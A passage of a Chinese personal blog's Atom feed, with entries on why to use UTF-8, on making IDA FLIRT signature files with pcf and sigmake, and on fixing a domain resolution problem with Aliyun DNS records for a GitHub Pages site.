        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="DuiLib" scheme="http://xwdidi.top/tags/DuiLib/"/>
    
  </entry>
  
  <entry>
    <title>(转载)为何建议使用UTF-8</title>
    <link href="http://xwdidi.top/2018/11/03/2018-11-03-(%E8%BD%AC%E8%BD%BD)UTF-8%E5%BF%83%E5%BE%97/"/>
    <id>http://xwdidi.top/2018/11/03/2018-11-03-(转载)UTF-8心得/</id>
    <published>2018-11-02T16:00:00.000Z</published>
    <updated>2019-04-06T14:00:58.819Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="http://utf8everywhere.org/zh-cn#myth.strlen.correctness" target="_blank" rel="noopener">http://utf8everywhere.org/zh-cn#myth.strlen.correctness</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="转载" scheme="http://xwdidi.top/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="字符集" scheme="http://xwdidi.top/tags/%E5%AD%97%E7%AC%A6%E9%9B%86/"/>
    
      <category term="UTF-8" scheme="http://xwdidi.top/tags/UTF-8/"/>
    
      <category term="Unicode" scheme="http://xwdidi.top/tags/Unicode/"/>
    
  </entry>
  
  <entry>
    <title>熟悉IDA,以及手工制作sig文件.</title>
    <link href="http://xwdidi.top/2018/10/03/2018-10-03-%E7%86%9F%E6%82%89IDA,%E4%BB%A5%E5%8F%8A%E6%89%8B%E5%B7%A5%E5%88%B6%E4%BD%9Csig%E6%96%87%E4%BB%B6/"/>
    <id>http://xwdidi.top/2018/10/03/2018-10-03-熟悉IDA,以及手工制作sig文件/</id>
    <published>2018-10-02T16:00:00.000Z</published>
    <updated>2019-11-08T15:49:46.797Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="第一步-打包制作lib"><a href="#第一步-打包制作lib" class="headerlink" title="第一步 打包制作lib"></a>第一步 打包制作lib</h3><p>obj是.c文件编译后的格式</p><p>因为vs下工具的不熟悉,网上查的指令无法实现</p><p>暂时使用g++带的打包工具打包,若以后得知会进行补充</p><p>命令为 ar cr libc.lib  main.o 生成了名为libc的库</p><blockquote><p>打包(archive)，于是就成为了传说中的库文件(library)。在Windows下这种包叫“库文件”（Library File)，也就是 .lib 文件，在UNIX下，是Archive File，也就是 .a 文件。</p></blockquote><p>放入ida中可看到</p><p><img src="https://i.loli.net/2018/10/03/5bb4e03a8bc75.jpg" alt></p><h3 id="使用pcf-exe-特征提取工具"><a href="#使用pcf-exe-特征提取工具" class="headerlink" title="使用pcf.exe(特征提取工具)"></a>使用pcf.exe(特征提取工具)</h3><p>在flair工具包里</p><p>命令为 <code>pcf main.o</code></p><p>得到main.pat</p><p><img src="https://i.loli.net/2018/10/03/5bb4e1ef04f71.jpg" alt></p><p>特征码内部结构.2E2E2E什么的应该做补充.感觉ascii也能感觉大概是什么</p><h3 id="生成-sig文件"><a href="#生成-sig文件" class="headerlink" title="生成.sig文件"></a>生成.sig文件</h3><p>命令 <code>sigmake main.pat main.sig</code></p><p>出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;--------- (delete these lines to allow sigmake to read this file)</span><br><span class="line">; add &apos;+&apos; at the start of a line to select a module</span><br><span class="line">; add &apos;-&apos; if you are not sure about the selection</span><br><span class="line">; do nothing if you want to exclude all modules</span><br><span class="line"></span><br><span class="line">?y@Point@@UEBAMXZ                                 00 0000 48894C24080F57C0C3..............................................</span><br><span class="line">?z@Point@@UEBAMXZ                                 00 0000 48894C24080F57C0C3..............................................</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.删除上面4行以分号开头的注释 </span><br><span class="line">2.sigmake让你仅指定一个函数作为相关签名的匹配函数。任何时候，如果在数据库中发现一个对应的签名，并且你想应用一个函数的名称，那么，你可以在该函数名称前附加一个加号；如果你只想在数据库中添加某个函数的注释，则在该函数名称前附加一个减号；如果在数据库中发现对应的签名时，你不想应用任何名称，那么，你不需要添加任何符号。（+号只能有一个，-号和+号二者只能存一） </span><br><span class="line"></span><br><span class="line">（1）为最大限度地减少冲突，请删除排斥文件开头的4个注释行。 </span><br><span class="line">  （2）最多只能给冲突函数组中的一个函数附加+/-。 </span><br><span class="line">  （3）如果一个冲突函数组仅包含一个函数，不要在该函数前附加+/-，让它保持原状即可。 </span><br><span class="line">  （4）sigmake连续运行失败会将数据（包括注释行）附加到现有的任何.exc文件后。在再次运行sigmake之前，你必须删除这些额外的数据，并更正原始数据（如果这些数据是正确的，sigmake将不会再次运行失败）。</span><br><span class="line"></span><br><span class="line">---------------------</span><br><span class="line"></span><br><span class="line">本文来自 花熊 的CSDN 博客 ，全文地址请点击：https://blog.csdn.net/hgy413/article/details/50612296?utm_source=copy</span><br></pre></td></tr></table></figure><p>然后再次执行相同命令 生成sig文件</p><p>放入到ida的sig目录下 通过shift+f5导入sig文件就能实现对机器码的转换</p><blockquote><p><a href="https://blog.csdn.net/gyh198/article/details/7028530" target="_blank" rel="noopener">https://blog.csdn.net/gyh198/article/details/7028530</a> 工具说明</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="IDA" scheme="http://xwdidi.top/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>域名解析问题     阿里云</title>
    <link href="http://xwdidi.top/2018/09/11/2018-09-11-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://xwdidi.top/2018/09/11/2018-09-11-博客搭建/</id>
    <published>2018-09-10T16:00:00.000Z</published>
    <updated>2019-11-08T15:50:52.027Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>新购买的域名成功使用了一周之后，无法被解析成功。 </p><p>后通过实名认证，才能继续使用。</p><p>域名可能存在着一周的试用期。一定要去实名认证啊！</p><p>下面是配置表格</p><table><thead><tr><th>记录类型</th><th>主机记录</th><th>记录值</th></tr></thead><tbody><tr><td>A</td><td>@</td><td>185.199.109.153</td></tr><tr><td>CNAME</td><td>www</td><td>xuwei98.github.io</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Blog" scheme="http://xwdidi.top/tags/Blog/"/>
    
  </entry>
  
</feed>
